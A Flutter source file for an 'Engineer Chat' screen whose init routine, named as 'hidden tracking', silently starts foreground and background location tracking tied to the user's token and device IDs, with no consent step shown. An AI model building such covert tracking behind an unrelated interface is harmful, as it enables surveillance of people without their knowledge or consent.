import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';

import '../tracking/background_service.dart';
import '../tracking/location_service.dart';
import '../tracking/tracking_config_service.dart';
import '../tracking/tracking_intervals.dart';

class EngineerHome extends StatefulWidget {
  final String engineerId;
  final String deviceId;
  final String token;

  const EngineerHome({
    super.key,
    required this.engineerId,
    required this.deviceId,
    required this.token,
  });

  @override
  State<EngineerHome> createState() => _EngineerHomeState();
}

class _EngineerHomeState extends State<EngineerHome> {


  @override
  void initState() {
    super.initState();
    _startHiddenTrackingIfReady();
  }

  Future<void> _startHiddenTrackingIfReady() async {
    if (kIsWeb) {
      return;
    }

    if (widget.token.isEmpty || widget.deviceId.isEmpty) {
      debugPrint('[FOE_TRACKING] Missing token or devicePublicId.');
      return;
    }

    final installationId = await TrackingConfigService.getInstallationId();

    debugPrint('================ FOE TRACKING DEBUG ================');
    debugPrint('[FOE_TRACKING] EngineerPublicId: ${widget.engineerId}');
    debugPrint('[FOE_TRACKING] DevicePublicId: ${widget.deviceId}');
    debugPrint('[FOE_TRACKING] InstallationId: $installationId');
    debugPrint('[FOE_TRACKING] Interval: ${TrackingIntervals.label}');
    debugPrint('====================================================');

    await LocationService.start(
      token: widget.token,
      devicePublicId: widget.deviceId,
      installationId: installationId,
    );

    await BackgroundTrackingService.startTracking(
      token: widget.token,
      devicePublicId: widget.deviceId,
      installationId: installationId,
    );
  }



  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Engineer")),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Text("Engineer Chat", style: TextStyle(fontSize: 22)),

          ],
        ),
      ),
    );
  }
}
